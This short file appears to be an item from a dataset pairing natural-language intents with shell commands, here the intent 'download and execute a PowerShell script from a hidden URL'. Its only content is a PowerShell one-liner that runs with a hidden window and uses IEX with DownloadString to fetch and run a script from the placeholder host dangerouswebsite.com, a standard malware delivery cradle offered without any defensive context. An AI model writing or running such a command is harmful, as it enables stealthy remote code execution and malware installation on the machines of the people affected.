# Natural language intent:
# Download and execute a PowerShell script from a hidden URL.

powershell.exe -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://dangerouswebsite.com/file.ps1')"
